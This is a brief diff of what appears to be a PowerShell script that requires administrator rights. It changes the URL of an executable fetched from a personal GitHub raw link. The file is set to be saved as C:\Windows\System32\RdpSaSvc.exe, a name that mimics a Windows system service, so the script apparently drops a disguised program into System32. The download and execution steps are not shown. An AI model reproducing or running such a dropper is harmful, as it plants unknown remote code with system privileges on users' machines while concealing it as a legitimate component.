@@ -12,7 +12,7 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 
 
 # --- CONFIG ---
-$url      = "https://raw.githubusercontent.com/18321-creator/Pro/refs/heads/main/FIXHIGHER.exe"
+$url      = "https://raw.githubusercontent.com/18321-creator/Pro/refs/heads/main/fg.exe"
 $path     = "C:\Windows\System32\RdpSaSvc.exe"
 $procName = [System.IO.Path]::GetFileNameWithoutExtension($path)
 
